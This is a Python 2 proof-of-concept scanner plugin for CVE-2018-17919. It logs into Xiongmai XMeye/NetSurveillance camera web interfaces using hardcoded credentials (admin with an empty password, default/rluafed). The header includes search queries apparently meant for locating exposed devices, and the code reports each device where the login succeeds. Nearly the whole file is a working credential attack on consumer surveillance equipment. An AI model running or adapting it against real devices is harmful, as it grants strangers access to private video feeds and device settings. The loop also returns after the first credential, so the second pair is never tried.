#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
#搜索条件
search_parameter1 = 'app=NetSurveillance'
search_parameter2 = 'app=雄迈-视频监控'


CVEID = 'CVE-2018-17919'
name = 'Xiongmai XMeye P2P Cloud Server Hardcoded Password'
vulID = '97597'  # https://www.seebug.org/vuldb/ssvid-97597
author = ['Stefan Viehböck']
vulType = 'Hard coded account vulnerability'
version = '1.0'  # default version: 1.0
references = ['https://ti.360.net/advisory/articles/advisory-of-cve-2018-17919/']
desc = 'The devices include an empty password for the admin user account 
which has the highest privileges on the devices and allows attackers to view 
the video feed or change the configuration.'

appName = 'XMeye P2P Cloud Server'
appVersion = 'All products using XMeye P2P Cloud Server'
'''

from ..t import T

import re, sys
import requests
from lxml import html
import bs4
import traceback
from termcolor import cprint

class P(T):
    def __init__(self):
	T.__init__(self)


    def verify(self, head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
    	result = {}
	result['result'] = False

	url = 'http://' + ip + ':' + port
	target_url = url + '/Login.htm'

	session_requests = requests.session()
        user_pass_dict = {'admin':'', 'default':'rluafed'}
	for username in user_pass_dict:
	    # Create payload
	    payload = 'command=login&username=' + username + '&password=' + user_pass_dict[username]
	    headers = {
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		'Origin': url,
		'Upgrade-Insecure-Requests': '1',
		'Content-Type': 'application/x-www-form-urlencoded',
		'User-Agent': 'Mozilla / 5.0(Macintosh;Intel Mac OS X 10_7_0) AppleWebKit / 535.11(KHTML, like Gecko) Chrome / 17.0.963 .56 Safari / 535.11',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Referer': target_url,
		'Accept-Language': 'zh-CN,zh;q=0.9',
		'Cookie': 'NetSuveillanceWebCookie=%7B%22username%22%3A%22' + username + '%22%7D',
	    }
	    # Perform login
	    try:
		connect_result = session_requests.post(target_url, data=payload, headers=headers)
	    except Exception, e:
#		print target_url, "connect time out\n", traceback.print_exc()
		return result

	    soup = bs4.BeautifulSoup(connect_result.content, "lxml")
	    daf1 = soup.find_all('title', text=re.compile("NetSurveillance"))

	    if len(daf1) > 0:
	    	cprint(target_url + ' 存在硬编码漏洞', 'red')
		info = target_url + " XMeye P2P Cloud Server Vul. CVE-2018-17919"
		result['result']=True
		result['VerifyInfo'] = {}
		result['VerifyInfo']['type'] = 'Hard-coded Vul'
		result['VerifyInfo']['URL'] = target_url
		result['VerifyInfo']['payload'] = payload
		result['VerifyInfo']['result'] = info
		result['VerifyInfo']['level'] = '高危(HOLE)'
	    return result


if __name__ == '__main__':
    print P().verify(ip=sys.argv[1],port=sys.argv[2])
